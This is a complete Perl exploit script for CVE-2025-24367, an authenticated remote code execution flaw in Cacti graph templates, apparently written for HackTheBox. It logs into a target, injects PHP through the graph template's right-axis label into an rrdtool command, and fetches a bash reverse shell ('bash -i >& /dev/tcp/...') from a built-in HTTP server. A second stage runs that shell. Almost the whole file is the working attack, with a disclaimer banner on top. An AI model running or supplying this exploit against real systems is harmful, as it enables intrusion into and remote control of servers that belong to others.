#!/usr/bin/env perl

use strict;
use warnings;
use Getopt::Long;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common qw(POST GET);
use HTML::TreeBuilder;
use File::Temp;
use Time::HiRes qw(sleep);
use HTTP::Daemon;
use HTTP::Status qw(:constants);
use POSIX qw(setsid);

use constant {
    DEFAULT_TIMEOUT   => 30,
    DEFAULT_PROXY     => 'http://127.0.0.1:8080',
    SERVER_PORT       => 80,
};

my %config;

sub print_banner {
    print <<'BANNER';
###########################################################
#                                                         #
# CVE-2025-24367 - Cacti Authenticated Graph Template RCE #
#         Created by TheCyberGeek @ HackTheBox            #
#             For educational purposes only               #
#                                                         #
###########################################################

BANNER
}

sub parse_args {
    my %opts;
    
    GetOptions(
        'u=s'     => \$opts{username},
        'p=s'     => \$opts{password},
        'i=s'     => \$opts{reverse_ip},
        'l=s'     => \$opts{reverse_port},
        'url=s'   => \$opts{base_url},
        'proxy'   => \$opts{use_proxy},
        'debug'   => \$opts{debug},
        'help|h'  => \$opts{help},
    ) or usage();
    
    usage() if $opts{help};
    
    my @required = qw(username password reverse_ip reverse_port base_url);
    my @missing;
    
    for my $field (@required) {
        push @missing, $field unless $opts{$field};
    }
    
    if (@missing) {
        die "Error: Missing required arguments: " . join(', ', @missing) . "\n\n";
    }
    
    $opts{base_url} =~ s/\/$//;
    
    return \%opts;
}

sub usage {
    print <<'USAGE';
CVE-2025-24367 - Cacti Authenticated Graph Template RCE
Created by TheCyberGeek @ HackTheBox

Usage: exploit.pl [OPTIONS]

Required Options:
  -u <username>      Username for authentication
  -p <password>      Password for authentication
  -i <ip>            IP address for reverse shell
  -l <port>          Port number for reverse shell
  -url <url>         Base URL of Cacti instance

Optional:
  -proxy             Enable HTTP proxy at http://127.0.0.1:8080
  -debug             Enable debug output
  -h, -help          Show this help message

Examples:
  sudo ./exploit.pl -u admin -p password -i 10.10.14.5 -l 4444 -url http://target.com
  sudo ./exploit.pl -u admin -p password -i 10.10.14.5 -l 4444 -url http://target.com -proxy -debug

Notes:
  • Requires root/sudo privileges to bind port 80
  • Start listener before running: nc -lvnp <port>
  • For educational and authorized testing only

USAGE
    exit 0;
}

sub create_ua {
    my ($opts) = @_;
    
    my $ua = LWP::UserAgent->new(
        timeout      => DEFAULT_TIMEOUT,
        cookie_jar   => HTTP::Cookies->new(),
        max_redirect => 7,
    );
    
    $ua->agent('Mozilla/5.0');
    
    if ($opts->{use_proxy}) {
        $ua->proxy(['http', 'https'], DEFAULT_PROXY);
        print "[i] Using proxy: " . DEFAULT_PROXY . "\n";
    }
    
    return $ua;
}

sub check_cacti {
    my ($ua, $base_url, $debug) = @_;
    
    my $response = $ua->get($base_url);
    
    if ($debug) {
        print "[DEBUG] Initial check status: " . $response->code . "\n";
        print "[DEBUG] Final URL: " . $response->request->uri . "\n";
    }
    
    my $content = $response->decoded_content || '';
    
    if ($debug) {
        print "[DEBUG] Check response length: " . length($content) . "\n";
        print "[DEBUG] First 200 chars: " . substr($content, 0, 200) . "\n";
    }
    
    if ($content =~ /Cacti/i || $response->request->uri =~ /cacti/i) {
        print "[+] Cacti instance detected!\n";
        return 1;
    }
    
    if ($response->code < 500) {
        print "[*] Connected to target, attempting exploitation...\n";
        return 1;
    }
    
    die "Failed to connect to target: " . $response->status_line . "\n";
}

sub extract_csrf_token {
    my ($text) = @_;
    
    my @patterns = (
        qr/var\s+csrfMagicToken\s*=\s*"(sid:[a-z0-9]+,[a-z0-9]+)/i,
        qr/var\s+csrfMagicToken\s*=\s*"(sid:[a-zA-Z0-9]+,[a-zA-Z0-9]+)/,
        qr/__csrf_magic"\s+value="([^"]+)"/,
        qr/csrfMagicToken\s*=\s*"([^"]+)"/,
    );
    
    for my $pattern (@patterns) {
        if ($text =~ /$pattern/) {
            return $1;
        }
    }
    
    return undef;
}

sub login {
    my ($ua, $opts) = @_;
    
    # Try both base URL and /cacti/
    my @login_urls = (
        $opts->{base_url},
        $opts->{base_url} . '/cacti/',
    );
    
    my ($content, $csrf_token, $login_url);
    
    for my $url (@login_urls) {
        print "[DEBUG] Trying login page: $url\n" if $opts->{debug};
        
        my $response = $ua->get($url);
        next unless $response->is_success;
        
        $content = $response->decoded_content;
        $csrf_token = extract_csrf_token($content);
        
        if ($csrf_token) {
            $login_url = $url;
            last;
        }
    }
    
    die "Failed to fetch login page or extract CSRF token\n" 
        unless $csrf_token;
    
    if ($opts->{debug}) {
        print "[DEBUG] Login page response length: " . length($content) . "\n";
        print "[DEBUG] Extracted CSRF token: $csrf_token\n";
    }
    
    # Determine POST URL - normalize the path
    my $post_url;
    if ($login_url =~ m{/cacti/?$}) {
        # Already has /cacti in it
        $post_url = $login_url;
        $post_url =~ s{/?$}{/index.php};
    } else {
        # Need to add /cacti
        $post_url = $opts->{base_url} . '/cacti/index.php';
    }
    
    print "[DEBUG] Posting login to: $post_url\n" if $opts->{debug};
    
    my $response = $ua->post($post_url, [
        '__csrf_magic'   => $csrf_token,
        'action'         => 'login',
        'login_username' => $opts->{username},
        'login_password' => $opts->{password},
    ]);
    
    if ($opts->{debug}) {
        print "[DEBUG] Login response status: " . $response->code . "\n";
        print "[DEBUG] Final URL after redirects: " . $response->request->uri . "\n";
    }
    
    # After POST, follow the redirect and check the final page
    my $check_url = $opts->{base_url} . '/cacti/index.php';
    $response = $ua->get($check_url);
    
    $content = $response->decoded_content;
    
    if ($opts->{debug}) {
        print "[DEBUG] Post-login check response length: " . length($content) . "\n";
        print "[DEBUG] Contains 'Console': " . 
            ($content =~ /Console/i ? 'yes' : 'no') . "\n";
        print "[DEBUG] Contains 'Graphs': " . 
            ($content =~ /Graphs/i ? 'yes' : 'no') . "\n";
        print "[DEBUG] Contains 'logout': " . 
            ($content =~ /logout/i ? 'yes' : 'no') . "\n";
    }
    
    # Check for successful login indicators
    if ($content =~ /Console/i || 
        $content =~ /Graphs/i || 
        $content =~ /logout/i ||
        $content =~ /graph_view\.php/i) {
        print "[+] Login Successful!\n";
        return 1;
    }
    
    # If we still see the login form, authentication failed
    if ($content =~ /login_username/i || $content =~ /login_password/i) {
        die "Authentication failed - check credentials\n";
    }
    
    # If we're not sure, dump some content for debugging
    if ($opts->{debug}) {
        print "[DEBUG] First 1000 chars of response:\n";
        print substr($content, 0, 1000) . "\n";
    }
    
    die "Authentication failed - check credentials\n";
}

sub get_template_id {
    my ($ua, $opts) = @_;
    
    my $url = $opts->{base_url} . '/cacti/graph_templates.php?' .
        'filter=' . uri_escape('Unix - Logged in Users') .
        '&rows=-1&has_graphs=false';
    
    print "[DEBUG] Fetching template URL: $url\n" if $opts->{debug};
    
    my $response = $ua->get($url);
    die "Failed to fetch template list: " . $response->status_line . "\n"
        unless $response->is_success;
    
    my $content = $response->decoded_content;
    
    if ($opts->{debug}) {
        print "[DEBUG] Template search response length: " . 
            length($content) . "\n";
    }
    
    my $tree = HTML::TreeBuilder->new_from_content($content);
    my @checkboxes = $tree->look_down('_tag' => 'input', 
        sub { ($_[0]->attr('id') // '') =~ /^chk_/ });
    
    if ($opts->{debug}) {
        print "[DEBUG] Looking for template checkboxes...\n";
        for my $cb (@checkboxes) {
            my $id = $cb->attr('id');
            print "[DEBUG] Found checkbox ID: $id\n" if $id;
        }
    }
    
    my $template_id;
    for my $cb (@checkboxes) {
        my $id = $cb->attr('id') // '';
        if ($id =~ /^chk_(\d+)$/) {
            $template_id = $1;
            print "[DEBUG] Found template ID from '$id': $template_id\n"
                if $opts->{debug};
            last;
        }
    }
    
    $tree->delete;
    
    die "Failed to locate graph template ID\n" unless $template_id;
    
    print "[+] Got graph ID: $template_id\n";
    return $template_id;
}

sub uri_escape {
    my ($str) = @_;
    $str =~ s/([^A-Za-z0-9\-_.~])/sprintf("%%%02X", ord($1))/eg;
    return $str;
}

sub random_string {
    my ($length) = @_;
    my @chars = ('a'..'z', 'A'..'Z', 0..9);
    return join '', map { $chars[rand @chars] } 1..$length;
}

sub write_payload_file {
    my ($opts) = @_;
    
    my $payload = "#!/bin/bash\nbash -i >& /dev/tcp/" . 
        $opts->{reverse_ip} . "/" . $opts->{reverse_port} . " 0>&1";
    
    open my $fh, '>', 'bash' or die "Failed to write payload file: $!\n";
    print $fh $payload;
    close $fh;
    chmod 0644, 'bash';
    
    print "[DEBUG] Created payload file\n" if $opts->{debug};
}

sub build_template_payload {
    my ($ua, $opts, $template_id, $stage) = @_;
    
    my $url = $opts->{base_url} . '/cacti/graph_templates.php?' .
        "action=template_edit&id=$template_id";
    
    print "[DEBUG] Fetching template edit page: $url\n" if $opts->{debug};
    
    my $response = $ua->get($url);
    die "Failed to fetch template page: " . $response->status_line . "\n"
        unless $response->is_success;
    
    my $content = $response->decoded_content;
    my $csrf_token = extract_csrf_token($content);
    
    die "Failed to extract CSRF token\n" unless $csrf_token;
    
    print "[DEBUG] Template page CSRF token: $csrf_token\n" if $opts->{debug};
    
    my $filename = random_string(5) . '.php';
    print "[i] Created PHP filename: $filename\n";
    
    my $right_axis_label;
    if ($stage eq 'write') {
        $right_axis_label = sprintf(
            "XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 " .
            "RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV " .
            "DEF:out=my.rrd:temp:AVERAGE " .
            "LINE1:out:<?=`curl\\x20%s/bash\\x20-o\\x20bash`;?>\n",
            $filename, $opts->{reverse_ip}
        );
    } else {
        $right_axis_label = sprintf(
            "XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 " .
            "RRA:AVERAGE:0.5:1:1200\ngraph %s -s now -a CSV " .
            "DEF:out=my.rrd:temp:AVERAGE " .
            "LINE1:out:<?=`bash\\x20bash`;?>\n",
            $filename
        );
    }
    
    return {
        template_id      => $template_id,
        filename         => $filename,
        csrf_token       => $csrf_token,
        right_axis_label => $right_axis_label,
    };
}

sub update_template {
    my ($ua, $opts, $payload) = @_;
    
    my $url = $opts->{base_url} . '/cacti/graph_templates.php?header=false';
    
    print "[DEBUG] Updating template at: $url\n" if $opts->{debug};
    
    my $response = $ua->post($url, [
        '__csrf_magic'            => $payload->{csrf_token},
        'name'                    => 'Unix - Logged in Users',
        'graph_template_id'       => $payload->{template_id},
        'graph_template_graph_id' => $payload->{template_id},
        'save_component_template' => '1',
        'title'                   => '|host_description| - Logged in Users',
        'vertical_label'          => 'percent',
        'image_format_id'         => '3',
        'height'                  => '200',
        'width'                   => '700',
        'base_value'              => '1000',
        'slope_mode'              => 'on',
        'auto_scale'              => 'on',
        'auto_scale_opts'         => '2',
        'auto_scale_rigid'        => 'on',
        'upper_limit'             => '100',
        'lower_limit'             => '0',
        'unit_value'              => '',
        'unit_exponent_value'     => '',
        'unit_length'             => '',
        'right_axis'              => '',
        'right_axis_label'        => $payload->{right_axis_label},
        'right_axis_format'       => '0',
        'right_axis_formatter'    => '0',
        'left_axis_formatter'     => '0',
        'auto_padding'            => 'on',
        'tab_width'               => '30',
        'legend_position'         => '0',
        'legend_direction'        => '0',
        'rrdtool_version'         => '1.7.2',
        'action'                  => 'save',
    ]);
    
    return 1;
}

sub trigger_execution {
    my ($ua, $opts) = @_;
    
    my $url = $opts->{base_url} . '/cacti/graph_json.php?' .
        'rra_id=0&local_graph_id=3&graph_start=1761683272' .
        '&graph_end=1761769672&graph_height=200&graph_width=700';
    
    print "[DEBUG] Triggering execution at: $url\n" if $opts->{debug};
    
    $ua->get($url);
    return 1;
}

sub check_payload_execution {
    my ($ua, $opts, $filename, $stage) = @_;
    
    my $check_url = $opts->{base_url} . '/cacti/' . $filename;
    
    print "[DEBUG] Checking payload at: $check_url\n" if $opts->{debug};
    
    my $ua_short = LWP::UserAgent->new(timeout => 2, cookie_jar => $ua->cookie_jar);
    my $response = $ua_short->get($check_url);
    
    if (!$response->is_success && $stage eq 'trigger') {
        print "[+] Hit timeout, looks good for shell, check your listener!\n";
        return 1;
    }
    
    if (!$response->is_success) {
        die "Failed checking payload: " . $response->status_line . "\n";
    }
    
    my $content = $response->decoded_content;
    
    if ($content =~ /File not found/i) {
        die "Exploit failed to execute - file not found\n";
    }
    
    if ($stage eq 'write' && $opts->{debug}) {
        print "[DEBUG] Payload uploaded successfully\n";
    }
    
    return 1;
}

sub trigger_payload {
    my ($ua, $opts, $template_id, $stage) = @_;
    
    my $payload = build_template_payload($ua, $opts, $template_id, $stage);
    update_template($ua, $opts, $payload);
    trigger_execution($ua, $opts);
    check_payload_execution($ua, $opts, $payload->{filename}, $stage);
}

sub start_http_server {
    my ($opts) = @_;
    
    my $pid = fork();
    die "Fork failed: $!\n" unless defined $pid;
    
    if ($pid == 0) {
        # Child process
        setsid();
        
        my $daemon = HTTP::Daemon->new(
            LocalPort => SERVER_PORT,
            ReuseAddr => 1,
        ) or die "Cannot create HTTP daemon: $!\n";
        
        while (my $client = $daemon->accept) {
            while (my $request = $client->get_request) {
                if ($request->uri->path eq '/bash') {
                    print "[+] Got payload request: /bash\n";
                    
                    if (open my $fh, '<', 'bash') {
                        my $content = do { local $/; <$fh> };
                        close $fh;
                        
                        my $response = HTTP::Response->new(HTTP_OK);
                        $response->content($content);
                        $client->send_response($response);
                    } else {
                        $client->send_error(HTTP_NOT_FOUND);
                    }
                } elsif ($opts->{debug}) {
                    print "[DEBUG] HTTP request: " . $request->uri->path . "\n";
                    $client->send_error(HTTP_NOT_FOUND);
                } else {
                    $client->send_error(HTTP_NOT_FOUND);
                }
            }
            $client->close;
        }
        exit 0;
    }
    
    # Parent process
    sleep 0.2;
    print "[+] Serving HTTP on port " . SERVER_PORT . "\n";
    return $pid;
}

sub stop_http_server {
    my ($pid) = @_;
    if ($pid) {
        kill 'TERM', $pid;
        waitpid($pid, 0);
        print "[+] Stopped HTTP server on port 80\n";
    }
}

# Main execution
sub main {
    print_banner();
    
    my $opts = parse_args();
    
    print "[*] Checking Cacti instance...\n";
    my $ua = create_ua($opts);
    check_cacti($ua, $opts->{base_url}, $opts->{debug});
    
    print "[*] Starting HTTP server...\n";
    my $server_pid = start_http_server($opts);
    
    eval {
        print "[*] Authenticating...\n";
        login($ua, $opts);
        
        print "[*] Getting template ID...\n";
        my $template_id = get_template_id($ua, $opts);
        
        write_payload_file($opts);
        
        print "[*] Writing payload to server...\n";
        trigger_payload($ua, $opts, $template_id, 'write');
        
        print "[*] Triggering payload...\n";
        trigger_payload($ua, $opts, $template_id, 'trigger');
        
        print "[+] Exploit completed successfully!\n";
    };
    
    my $error = $@;
    
    stop_http_server($server_pid);
    unlink 'bash' if -e 'bash';
    
    if ($error) {
        die "[!] Exploit failed: $error";
    }
}

main() unless caller;
